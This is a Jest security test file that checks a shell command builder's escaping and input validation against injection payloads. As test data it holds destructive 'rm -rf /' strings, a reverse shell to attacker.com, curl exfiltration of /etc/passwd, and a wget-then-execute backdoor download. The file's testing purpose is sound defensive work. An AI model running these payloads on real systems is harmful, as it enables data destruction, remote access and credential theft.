/**
 * Security Tests - Injection Payload Testing
 * 
 * Tests the command builder with various malicious payloads
 * to ensure proper escaping prevents command injection attacks.
 * 
 * Reference: OWASP Command Injection Prevention Cheat Sheet
 */

const {
  escapeForSingleQuotes,
  escapeForDoubleQuotes,
  buildKeeperCommand,
  validateCommandParameters
} = require('../../src/modules/utils/commandBuilder');

// ============================================================================
// Command Injection Payloads
// ============================================================================

describe('Command Injection Prevention', () => {
  /**
   * Common shell metacharacter injection attempts
   */
  describe('Shell Metacharacter Injection', () => {
    const metacharacterPayloads = [
      { name: 'semicolon command chain', payload: '; rm -rf /' },
      { name: 'ampersand background', payload: '& rm -rf /' },
      { name: 'double ampersand', payload: '&& rm -rf /' },
      { name: 'pipe to command', payload: '| cat /etc/passwd' },
      { name: 'backtick substitution', payload: '`whoami`' },
      { name: 'dollar paren substitution', payload: '$(whoami)' },
      { name: 'newline injection', payload: '\n rm -rf /' },
      { name: 'carriage return injection', payload: '\r rm -rf /' },
      { name: 'null byte injection', payload: '\x00 rm -rf /' },
      { name: 'redirect output', payload: '> /etc/passwd' },
      { name: 'redirect input', payload: '< /etc/passwd' },
      { name: 'here document', payload: '<< EOF\nmalicious\nEOF' }
    ];

    test.each(metacharacterPayloads)(
      'escapeForDoubleQuotes handles: $name',
      ({ payload }) => {
        const escaped = escapeForDoubleQuotes(payload);
        // Should not contain unescaped dangerous characters
        expect(escaped).not.toMatch(/[^\\]`/); // Unescaped backticks
        expect(escaped).not.toMatch(/[^\\]\$/); // Unescaped dollar signs
      }
    );

    test.each(metacharacterPayloads)(
      'escapeForSingleQuotes handles: $name',
      ({ payload }) => {
        const escaped = escapeForSingleQuotes(payload);
        // In single quotes, only ' needs escaping, everything else is literal
        expect(escaped.includes("'") ? escaped.includes("'\\''") : true).toBe(true);
      }
    );
  });

  /**
   * Quote escape attempts
   */
  describe('Quote Escape Injection', () => {
    const quotePayloads = [
      { name: 'double quote escape', payload: '" && rm -rf / && echo "' },
      { name: 'single quote escape', payload: "' && rm -rf / && echo '" },
      { name: 'mixed quotes', payload: `"'; rm -rf /; echo '"` },
      { name: 'nested quotes', payload: '"\'"\'"\'" && whoami' },
      { name: 'unicode quotes', payload: '"\u201c\u201d && whoami' },
      { name: 'backslash escape', payload: '\\" && rm -rf /' }
    ];

    test.each(quotePayloads)(
      'command builder safely handles: $name',
      ({ payload }) => {
        // Should either escape properly or throw validation error
        try {
          const command = buildKeeperCommand('record-add', {
            title: payload,
            recordType: 'login'
          }, 'TEST-1');
          
          // If it doesn't throw, command should be safe
          // Check that the payload is properly quoted/escaped
          expect(command).toContain('--title=');
          // The payload should not break out of quotes
          expect(command.split('--title=')[1]).toMatch(/^["'][^"']*["']|^"[^"]*"/);
        } catch (error) {
          // Validation error is also acceptable
          expect(error.message).toContain('validation');
        }
      }
    );
  });

  /**
   * Environment variable injection
   */
  describe('Environment Variable Injection', () => {
    const envPayloads = [
      { name: 'HOME variable', payload: '$HOME' },
      { name: 'PATH variable', payload: '$PATH' },
      { name: 'USER variable', payload: '$USER' },
      { name: 'braced variable', payload: '${HOME}' },
      { name: 'command in variable', payload: '${$(whoami)}' },
      { name: 'variable length', payload: '${#PATH}' }
    ];

    test.each(envPayloads)(
      'escapeForDoubleQuotes neutralizes: $name',
      ({ payload }) => {
        const escaped = escapeForDoubleQuotes(payload);
        // Dollar signs should be escaped
        expect(escaped).not.toMatch(/(?<!\\)\$/);
      }
    );
  });

  /**
   * Real-world attack payloads
   */
  describe('Real-World Attack Payloads', () => {
    test('reverse shell attempt', () => {
      const payload = '$(bash -i >& /dev/tcp/attacker.com/4444 0>&1)';
      const escaped = escapeForDoubleQuotes(payload);
      // The $ should be escaped with backslash
      expect(escaped).toContain('\\$');
      // Verify the escape is at the start (before the parenthesis)
      expect(escaped).toMatch(/^\\\$/);
    });

    test('data exfiltration attempt', () => {
      const payload = '`curl -d @/etc/passwd http://attacker.com`';
      const escaped = escapeForDoubleQuotes(payload);
      expect(escaped).not.toMatch(/[^\\]`/);
    });

    test('chained commands', () => {
      const payload = 'legitimate; wget http://malware.com/backdoor -O /tmp/x && chmod +x /tmp/x && /tmp/x';
      
      // In double quotes context
      const doubleEscaped = escapeForDoubleQuotes(payload);
      expect(doubleEscaped).toContain('legitimate');
      
      // In single quotes context - everything is literal
      const singleEscaped = escapeForSingleQuotes(payload);
      expect(singleEscaped).toContain('legitimate');
    });

    test('SQL-style injection (should pass through as literal)', () => {
      const payload = "'; DROP TABLE users; --";
      const command = buildKeeperCommand('record-add', {
        title: payload,
        recordType: 'login'
      }, 'TEST-1');
      
      // This is for shell commands, not SQL - payload should be escaped as shell
      expect(command).toContain('--title=');
    });
  });
});

// ============================================================================
// Input Length Attack Tests
// ============================================================================

describe('Input Length Attack Prevention', () => {
  test('rejects excessively long title', () => {
    const longTitle = 'A'.repeat(10000);
    const result = validateCommandParameters('record-add', {
      title: longTitle,
      recordType: 'login'
    });
    expect(result.valid).toBe(false);
    expect(result.errors.join(' ')).toContain('exceeds');
  });

  test('rejects excessively long notes', () => {
    const longNotes = 'A'.repeat(50000);
    const result = validateCommandParameters('record-add', {
      title: 'Test',
      notes: longNotes
    });
    expect(result.valid).toBe(false);
  });

  test('rejects excessively long URL', () => {
    const longUrl = 'https://example.com/' + 'a'.repeat(5000);
    const result = validateCommandParameters('record-add', {
      title: 'Test',
      url: longUrl
    });
    expect(result.valid).toBe(false);
  });
});

// ============================================================================
// Special Character Combination Tests
// ============================================================================

describe('Special Character Combinations', () => {
  test('handles nested escape sequences', () => {
    const payload = '\\\\\\`\\$\\"';
    const escaped = escapeForDoubleQuotes(payload);
    // Each backslash should be doubled, backtick and dollar escaped
    expect(escaped.split('\\\\').length).toBeGreaterThan(1);
  });

  test('handles unicode characters', () => {
    const payload = 'Test 你好 مرحبا 🔒';
    const escaped = escapeForDoubleQuotes(payload);
    expect(escaped).toContain('你好');
    expect(escaped).toContain('🔒');
  });

  test('handles null bytes and control characters', () => {
    const payload = 'test\x00\x01\x02value';
    // sanitizeJsonObject should strip these
    const { sanitizeJsonObject } = require('../../src/modules/utils/commandBuilder');
    const result = sanitizeJsonObject({ field: payload });
    expect(result.field).not.toMatch(/[\x00-\x1f]/);
  });
});

// ============================================================================
// Format String Attack Tests
// ============================================================================

describe('Format String Attack Prevention', () => {
  test('handles printf-style format strings', () => {
    const payloads = [
      '%s%s%s%s%s',
      '%n%n%n%n',
      '%x%x%x%x',
      '%.1000000d'
    ];

    payloads.forEach(payload => {
      // These should pass through as literal strings
      const escaped = escapeForDoubleQuotes(payload);
      expect(escaped).toContain('%');
    });
  });
});

// ============================================================================
// Path Traversal Tests
// ============================================================================

describe('Path Traversal in Inputs', () => {
  test('handles path traversal in title', () => {
    const payload = '../../../etc/passwd';
    const command = buildKeeperCommand('record-add', {
      title: payload,
      recordType: 'login'
    }, 'TEST-1');
    
    // Path traversal in title is okay (it's just a string label)
    expect(command).toContain('../../../etc/passwd');
  });

  test('handles path traversal in notes', () => {
    const payload = 'Reference: ../../../../etc/shadow';
    const command = buildKeeperCommand('record-add', {
      title: 'Test',
      notes: payload
    }, 'TEST-1');
    
    // Notes can contain path references - they're just text
    expect(command).toContain('Notes=');
  });
});

// ============================================================================
// Integration: Full Command Safety Tests
// ============================================================================

describe('Full Command Safety', () => {
  test('built command is safe for shell execution', () => {
    const dangerousInputs = {
      title: 'Test"; rm -rf / #',
      notes: '$(cat /etc/passwd)',
      login: '`id`',
      password: '$USER'
    };

    const command = buildKeeperCommand('record-add', dangerousInputs, 'TEST-1');
    
    // Command should contain escaped versions
    // Check that dangerous patterns are escaped (have backslash before them)
    expect(command).not.toMatch(/[^\\]";\s*rm/);
    // The $ should be escaped - check for \$ before (cat
    expect(command).toContain('\\$(cat');
    expect(command).not.toMatch(/[^\\]`id`/);
  });

  test('share command with malicious user email', () => {
    // Malicious email should be rejected by validation before command building
    expect(() => {
      buildKeeperCommand('share-record', {
        record: 'abc123',
        user: "user@test.com'; rm -rf /"
      }, 'TEST-1');
    }).toThrow('Input validation failed');
  });

  test('share command with valid email is properly escaped', () => {
    const command = buildKeeperCommand('share-record', {
      record: 'abc123',
      user: "user@test.com"
    }, 'TEST-1');

    // Should contain the user parameter
    expect(command).toContain("--user='user@test.com'");
  });
});
